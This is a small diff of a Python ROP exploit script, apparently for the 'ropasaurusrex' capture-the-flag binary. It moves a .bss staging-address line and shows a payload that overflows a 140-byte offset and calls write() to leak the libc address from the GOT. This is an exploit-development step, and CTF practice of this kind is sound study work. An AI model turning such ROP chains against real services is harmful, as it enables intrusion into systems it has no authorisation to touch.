@@ -21,11 +21,10 @@ offset = 140
 
 rop = ROP('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')
 libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+addr_stage = rop.section('.bss') + 0x800
 
 # p = Proc(host='localhost', port=5000)
 p = Proc(rop.fpath)
-
-addr_stage = rop.section('.bss') + 0x800
 
 buf = rop.fill(offset)
 buf += rop.call_plt('write', 1, rop.got('__libc_start_main'), 4)
